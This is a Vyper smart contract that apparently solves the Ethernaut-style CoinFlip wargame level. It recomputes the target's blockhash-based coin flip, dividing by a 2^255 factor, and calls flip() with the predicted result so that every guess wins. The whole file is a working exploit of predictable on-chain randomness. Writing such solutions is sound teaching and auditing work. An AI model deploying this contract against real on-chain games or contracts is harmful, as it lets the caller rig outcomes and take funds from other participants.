# @version ^0.3.7

interface InstanceInterface:
    def consecutiveWins() -> uint256: view
    def flip(_guess: bool) -> bool: nonpayable

owner: immutable(address)

FACTOR: constant(uint256) = 57896044618658097711785492504343953926634992332820282019728792003956564819968

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance

@external
@view
def wins() -> uint256:
    return self.instance.consecutiveWins()

@external
def attack():
    assert msg.sender == owner, "!owner"
    guess: bool = self._guess()
    assert self.instance.flip(guess), "!guess"

@internal
def _guess() -> bool:
    guess: bool = empty(bool)
    blockValue: uint256 = convert((blockhash(block.number - 1)), uint256)
    coinFlip: uint256 = blockValue / FACTOR
    if coinFlip == 1:
        guess = True
    else:
        guess = False
    return guess
